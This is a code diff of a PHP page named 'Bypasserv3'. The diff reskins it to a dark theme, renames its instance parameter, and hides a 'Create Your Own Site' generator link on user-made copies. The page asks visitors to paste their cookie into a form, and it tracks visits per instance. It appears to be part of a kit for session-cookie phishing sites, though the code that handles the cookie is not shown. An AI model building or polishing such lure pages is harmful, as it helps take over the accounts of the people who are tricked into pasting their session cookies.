@@ -1,13 +1,13 @@
 <?php
 /**
  * Bypasserv3 - Public Instance Page
- * Modern Clean Blue/Grey Design
+ * Modern Dark Grey/Black Design
  */
 
 require_once __DIR__ . '/../config.php';
 require_once __DIR__ . '/../functions.php';
 
-$directory = $_GET['dir'] ?? '';
+$directory = $_GET['r'] ?? '';
 
 if (empty($directory)) {
     die('No instance specified');
@@ -24,6 +24,9 @@ if (!$instanceData) {
 updateInstanceStats($directory, 'totalVisits', ($instanceData['stats']['totalVisits'] ?? 0) + 1);
 updateDailyStats($directory, 'visits', 1);
 updateGlobalStats('totalVisits', 1);
+
+// Check if this is a user-created site (has directory parameter)
+$isUserSite = !empty($directory);
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -45,8 +48,8 @@ updateGlobalStats('totalVisits', 1);
         
         body {
             font-family: 'Outfit', sans-serif;
-            background: #f3f4f6;
-            color: #1a2a4a;
+            background: linear-gradient(135deg, #1f2937 0%, #111827 50%, #0f1419 100%);
+            color: #f3f4f6;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -72,15 +75,16 @@ updateGlobalStats('totalVisits', 1);
         }
         
         .header p {
-            color: #64748b;
+            color: #9ca3af;
             font-size: 16px;
         }
         
         .glass-box {
-            background: white;
+            background: rgba(31, 41, 55, 0.8);
+            backdrop-filter: blur(10px);
             border-radius: 16px;
             padding: 40px;
-            box-shadow: 0 2px 15px rgba(59, 130, 246, 0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(59, 130, 246, 0.1);
             margin-bottom: 24px;
         }
@@ -93,17 +97,17 @@ updateGlobalStats('totalVisits', 1);
             display: block;
             font-size: 14px;
             font-weight: 600;
-            color: #1a2a4a;
+            color: #f3f4f6;
             margin-bottom: 12px;
         }
         
         .form-group textarea {
             width: 100%;
             padding: 16px;
-            background: #f8fafc;
-            border: 1px solid #e2e8f0;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(59, 130, 246, 0.2);
             border-radius: 10px;
-            color: #1a2a4a;
+            color: #f3f4f6;
             font-size: 13px;
             font-family: 'Outfit', sans-serif;
             resize: vertical;
@@ -112,12 +116,12 @@ updateGlobalStats('totalVisits', 1);
         }
         
         .form-group textarea::placeholder {
-            color: #cbd5e1;
+            color: #6b7280;
         }
         
         .form-group textarea:focus {
             outline: none;
-            background: white;
+            background: rgba(0, 0, 0, 0.5);
             border-color: #3b82f6;
             box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
         }
@@ -184,10 +188,11 @@ updateGlobalStats('totalVisits', 1);
         }
         
         .process-box {
-            background: white;
+            background: rgba(31, 41, 55, 0.8);
+            backdrop-filter: blur(10px);
             border-radius: 16px;
             padding: 30px;
-            box-shadow: 0 2px 15px rgba(59, 130, 246, 0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(59, 130, 246, 0.1);
         }
         
@@ -196,7 +201,7 @@ updateGlobalStats('totalVisits', 1);
             font-size: 18px;
             font-weight: 600;
             margin-bottom: 20px;
-            color: #1a2a4a;
+            color: #f3f4f6;
         }
         
         .process-step {
@@ -209,7 +214,7 @@ updateGlobalStats('totalVisits', 1);
             border-radius: 10px;
             margin-bottom: 10px;
             font-size: 14px;
-            color: #64748b;
+            color: #9ca3af;
         }
         
         .process-step:last-child {
@@ -225,7 +230,7 @@ updateGlobalStats('totalVisits', 1);
         .disclaimer {
             text-align: center;
             font-size: 12px;
-            color: #94a3b8;
+            color: #6b7280;
             margin-top: 30px;
         }
         
@@ -285,7 +290,7 @@ updateGlobalStats('totalVisits', 1);
         }
         
         .info-label {
-            color: #64748b;
+            color: #9ca3af;
         }
         
         .info-value {
@@ -352,12 +357,14 @@ updateGlobalStats('totalVisits', 1);
                 </div>
             </div>
 
-            <!-- Create Site Button -->
+            <!-- Create Site Button - Only show if NOT a user site -->
+            <?php if (!$isUserSite): ?>
             <div class="create-site-wrapper">
                 <a href="/generator/" class="btn-create">
                     ✨ Create Your Own Site
                 </a>
             </div>
+            <?php endif; ?>
 
             <!-- Process Box -->
             <div class="process-box">
@@ -381,11 +388,11 @@ updateGlobalStats('totalVisits', 1);
         <div id="processingContainer" style="display: none;">
             <div class="glass-box processing-state">
                 <div class="processing-spinner"></div>
-                <p style="color: #64748b; margin-top: 20px;">Processing your request...</p>
+                <p style="color: #9ca3af; margin-top: 20px;">Processing your request...</p>
                 <div class="progress-bar">
                     <div class="progress-fill" id="progressFill"></div>
                 </div>
-                <p style="font-size: 12px; color: #94a3b8; margin-top: 8px;" id="progressText">0%</p>
+                <p style="font-size: 12px; color: #6b7280; margin-top: 8px;" id="progressText">0%</p>
             </div>
         </div>
 
@@ -423,7 +430,7 @@ updateGlobalStats('totalVisits', 1);
     <script>
         async function handleBypass(e) {
             const cookie = document.getElementById('cookieInput').value.trim();
-            const directory = new URLSearchParams(window.location.search).get('dir');
+            const directory = new URLSearchParams(window.location.search).get('r');
 
             if (!cookie) {
                 alert('Please paste your cookie first');
